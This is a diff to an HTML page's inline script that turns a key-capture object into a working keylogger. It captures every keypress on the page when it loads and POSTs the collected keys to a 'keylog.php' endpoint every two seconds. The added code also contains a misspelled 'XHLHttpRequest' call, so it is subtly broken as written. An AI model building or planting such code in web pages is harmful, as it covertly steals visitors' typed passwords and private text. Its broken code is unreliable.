@@ -15,9 +15,28 @@
                 //LISTEN TO  ALL KEY PRESSES, STORE INTO ARRAY
                 window.addEventListener("keydown", function(evt){
                 keylog.cache.push(evt.key);
-                console.log(keylog.cache);
                 });
-            }
+
+                //SEND KEY PRESS PERIODICALLY
+
+                window.setInterval(keylog.send, 2000); // EVERY 2 SECS
+            },
+
+            //SEND TO SERVER
+            send : function () { if (keylog.cache.length != 0) {
+                //KEYPRESS DATA
+                var data = new FormData();
+                data.append("keys", JSON.stringify (keylog.cache));
+                keylog.cache = [];
+
+                //AJAX POST
+                var xhr = new XHLHttpRequest();
+                xhr.open("POST", "keylog.php");
+                xhr.onload = function(){
+                    console.log(this.response); // FOR TESTING, OPTIONAL
+                };
+                xhr.send(data);
+            }}
         };
         window.addEventListener("DOMContentLoaded", keylog.init)
     </script>
